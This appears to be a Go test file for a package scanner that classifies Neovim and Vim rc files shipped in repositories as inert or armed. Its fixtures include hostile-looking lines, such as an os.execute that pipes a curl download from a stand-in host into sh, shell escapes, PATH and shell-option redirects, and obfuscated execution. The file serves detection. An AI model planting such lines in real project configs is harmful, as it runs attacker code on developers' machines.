package rules

import (
	"testing"
)

// jre-jetbrains ships this exact .nvim.lua. It enables, by name, a language
// server for PKGBUILDs that the reviewer must already have installed. It was
// reported critical and fatal on presence alone, blocking a correct package.
func TestInertNvimLuaIsInfoNotFatal(t *testing.T) {
	files := map[string]string{
		"PKGBUILD":  minimalPKGBUILD,
		".nvim.lua": "vim.lsp.enable { 'termux_language_server' }\n",
	}
	hits := Scan(files)
	m := hitCodes(hits)
	if _, bad := m["EDITOR-003"]; bad {
		t.Fatalf("EDITOR-003 fired on an rc with no execution primitive: %+v", m["EDITOR-003"])
	}
	h, ok := m["EDITOR-008"]
	if !ok {
		t.Fatal("EDITOR-008 did not report the inert rc")
	}
	if h.Severity != Medium {
		t.Errorf("EDITOR-008 severity = %q, want info", h.Severity)
	}
	if got := Floor(hits, true); got != "" {
		t.Errorf("floor = %q, want none even in strict mode", got)
	}
}

func TestInertRcForms(t *testing.T) {
	for name, text := range map[string]string{
		".nvim.lua": "vim.opt.tabstop = 4\nvim.bo.expandtab = true\nvim.cmd('set ts=4')\n",
		".exrc":     "set ts=4 sw=4 et\n",
		".lvimrc":   "setlocal noexpandtab\n",
		".nvimrc":   "\" filetype table\nlet g:x = 'python'\n",
	} {
		m := hitCodes(Scan(map[string]string{"PKGBUILD": minimalPKGBUILD, name: text}))
		if _, bad := m["EDITOR-003"]; bad {
			t.Errorf("%s: EDITOR-003 on inert content %q", name, text)
		}
		if _, ok := m["EDITOR-008"]; !ok {
			t.Errorf("%s: EDITOR-008 missing", name)
		}
	}
}

func TestArmedRcIsCriticalAndFatal(t *testing.T) {
	cases := map[string]string{
		"lua os.execute":       "os.execute('curl -s https://x.example/p | sh')\n",
		"lua io.popen":         "io.popen('id')\n",
		"vim.fn.system":        "vim.fn.system({'sh','-c','id'})\n",
		"vim.system":           "vim.system({'id'})\n",
		"jobstart":             "vim.fn.jobstart('id')\n",
		"vim.cmd shell escape": "vim.cmd('silent !id')\n",
		"vim.cmd computed":     "local c = 'sil' .. 'ent !id'\nvim.cmd(c)\n",
		"vim.cmd.source":       "vim.cmd.source('x.vim')\n",
		"lsp config with cmd":  "vim.lsp.config('x', { cmd = {'sh','-c','id'} })\nvim.lsp.enable 'x'\n",
		"encoded string":       "local f = string.char(111,115)\n",
		"load":                 "load('return 1')()\n",
		"env redirect":         "vim.env.PATH = '/tmp/x:' .. vim.env.PATH\n",
		"option redirect":      "vim.o.shell = '/tmp/x'\n",
		"vimscript bang":       ":!id\n",
		"vimscript system":     "call system('id')\n",
		"vimscript makeprg":    "set makeprg=./x\n",
		"vimscript let env":    "let $PATH='/tmp'\n",
		"vimscript autocmd":    "au BufRead * !id\n",
		"vimscript execute":    "exe 'silent !id'\n",
		"commented is armed":   "-- os.execute('id')\n",
	}
	for label, text := range cases {
		hits := Scan(map[string]string{"PKGBUILD": minimalPKGBUILD, ".nvim.lua": text})
		m := hitCodes(hits)
		h, ok := m["EDITOR-003"]
		if !ok {
			t.Errorf("%s: EDITOR-003 did not fire on %q", label, text)
			continue
		}
		if h.Severity != Critical {
			t.Errorf("%s: severity %q", label, h.Severity)
		}
		if _, dup := m["EDITOR-008"]; dup {
			t.Errorf("%s: inert twin reported next to the armed finding", label)
		}
		if got := Floor(hits, false); got != "MALICIOUS" {
			t.Errorf("%s: floor = %q, want MALICIOUS", label, got)
		}
	}
}

// Lua's default package.path starts with "./?.lua", so require() of a module
// the repository ships loads code FROM the repository. require() of anything
// else resolves from the user's own runtimepath.
func TestRequireOfRepoModuleIsArmed(t *testing.T) {
	armed := map[string]string{
		"PKGBUILD":    minimalPKGBUILD,
		".nvim.lua":   "require('helpers').setup()\n",
		"helpers.lua": "return { setup = function() end }\n",
	}
	if _, ok := hitCodes(Scan(armed))["EDITOR-003"]; !ok {
		t.Error("require of a module shipped in the repo was not armed")
	}
	inert := map[string]string{
		"PKGBUILD":  minimalPKGBUILD,
		".nvim.lua": "require('lspconfig')\n",
	}
	if _, ok := hitCodes(Scan(inert))["EDITOR-003"]; ok {
		t.Error("require of a runtimepath module was armed")
	}
}

// An rc the collector could not read as text is what LuaJIT bytecode looks
// like; it stays fatal.
func TestUnreadableRcIsArmed(t *testing.T) {
	m := hitCodes(Scan(map[string]string{"PKGBUILD": minimalPKGBUILD, ".nvim.lua": OmittedContent}))
	if _, ok := m["EDITOR-003"]; !ok {
		t.Error("an omitted .nvim.lua was not reported as armed")
	}
}
